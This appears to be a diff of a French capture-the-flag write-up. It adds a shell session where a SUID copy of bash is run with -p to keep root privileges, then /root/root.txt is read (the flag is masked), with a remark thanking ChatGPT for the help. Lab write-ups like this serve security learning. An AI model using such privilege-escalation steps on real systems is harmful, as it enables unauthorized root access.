@@ -313,6 +313,10 @@ Une fois le module exécuté, lance :
 
 Le -p empêche bash d'abandonner ses privilèges root. 🎉
 
-and try cat /root/root.txt
+graphasm@cypher:/tmp$ /tmp/bash -p
+bash-5.2# 
 
-
+yeah ! Thanks chatGPT :D
+Ok now
+bash-5.2# cat /root/root.txt
+XXXXXXXXXXXXXXXXXXXXXXXXXXXXXXx
